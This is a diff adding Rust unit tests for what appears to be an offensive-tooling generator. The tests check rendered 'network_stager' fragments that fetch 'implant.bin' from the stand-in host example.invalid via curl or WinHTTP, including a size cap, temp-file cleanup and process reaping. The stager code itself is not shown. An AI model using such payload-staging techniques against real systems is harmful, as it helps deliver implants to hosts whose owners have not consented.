@@ -217,6 +217,113 @@ fn renders_the_in_process_transport() {
 }
 
 #[test]
+fn both_transports_share_a_64_mib_staged_body_cap() {
+    // The cap lives in the shared fragment, so both transports render it.
+    assert!(
+        DEF.stub_fragment
+            .contains("const MAX_STAGED_BYTES: usize = 64 * 1024 * 1024;"),
+        "the shared cap must be 64 MiB"
+    );
+
+    let child = Params {
+        downloader: Downloader::Curl,
+        ..params("https://example.invalid/implant.bin")
+    }
+    .render_fragment(&strings());
+    let in_process = params("https://example.invalid/implant.bin").render_fragment(&strings());
+    for (name, fragment) in [("child-process", &child), ("in-process", &in_process)] {
+        assert!(
+            fragment.contains("const MAX_STAGED_BYTES: usize = 64 * 1024 * 1024;"),
+            "{name}: the cap is missing: {fragment}"
+        );
+    }
+}
+
+#[test]
+fn the_child_process_transport_cleans_up_and_bounds_the_read() {
+    let fragment = Params {
+        downloader: Downloader::Curl,
+        ..params("https://example.invalid/implant.bin")
+    }
+    .render_fragment(&strings());
+
+    // The guard exists before the downloader runs, so no error below it can
+    // leave the temp file on disk.
+    let guard = fragment
+        .find("let _cleanup = TempFile(out.clone());")
+        .expect("the temp-file guard is missing");
+    let download = fragment
+        .find("run_cmd(&bin, &args")
+        .expect("the downloader call is missing");
+    assert!(guard < download, "the guard must precede the download");
+    assert!(fragment.contains("impl Drop for TempFile"));
+    assert!(fragment.contains("std::fs::remove_file(&self.0)"));
+
+    // A timed-out downloader is reaped before the guard tries to delete the
+    // partial file it may still hold open; the `try_wait` error path does the
+    // same because the child's state is unknown there.
+    let kill = fragment
+        .find("child.kill()")
+        .expect("the timeout kill is missing");
+    let wait = fragment
+        .find("child.wait()")
+        .expect("the timeout reap is missing");
+    assert!(kill < wait, "the downloader must be reaped after the kill");
+    assert_eq!(
+        fragment.matches("child.kill()").count(),
+        2,
+        "both the timeout and the try_wait error path must kill the child"
+    );
+    assert_eq!(
+        fragment.matches("child.wait()").count(),
+        2,
+        "both the timeout and the try_wait error path must reap the child"
+    );
+
+    // The metadata check rejects an oversized file before reading it, and the
+    // bounded read catches metadata that lied or a file that grew.
+    assert!(fragment.contains("if meta.len() > MAX_STAGED_BYTES as u64"));
+    assert!(fragment.contains("take(MAX_STAGED_BYTES as u64 + 1)"));
+    let read = fragment
+        .find(".read_to_end(&mut bytes)")
+        .expect("the bounded read is missing");
+    let read_cap = fragment
+        .find("if bytes.len() > MAX_STAGED_BYTES")
+        .expect("the read-time cap is missing");
+    assert!(read < read_cap, "the read must be checked after it runs");
+}
+
+#[test]
+fn the_in_process_transport_rejects_an_oversized_body_while_reading() {
+    let fragment = params("https://example.invalid/implant.bin").render_fragment(&strings());
+
+    // The chunk `WinHttpQueryDataAvailable` reports is checked against the
+    // remaining budget before anything is allocated for it.
+    let budget = fragment
+        .find("let remaining = MAX_STAGED_BYTES.saturating_sub(bytes.len());")
+        .expect("the remaining budget is missing");
+    let reject = fragment
+        .find("if available as usize > remaining")
+        .expect("the oversized-chunk rejection is missing");
+    let allocation = fragment
+        .find("let mut chunk = vec![0u8; chunk_len];")
+        .expect("the capped allocation is missing");
+    assert!(
+        budget < reject && reject < allocation,
+        "the budget must be checked before the allocation"
+    );
+    assert!(fragment.contains("let chunk_len = (available as usize).min(remaining);"));
+}
+
+#[test]
+fn rejects_unknown_params_fields() {
+    let step: Result<TechniqueKind, _> = serde_yml::from_str(
+        "technique: network_stager\nparams:\n  payload: implant\n  url: \"https://example.invalid/a.bin\"\n  typo: 1\n",
+    );
+    assert!(step.is_err(), "an unknown params key must be rejected");
+}
+
+#[test]
 fn the_embedded_fallback_renders_the_fall_through() {
     let mut with_fallback = params("https://example.invalid/a.bin");
     with_fallback.fallback = StagerFallback::Embedded;
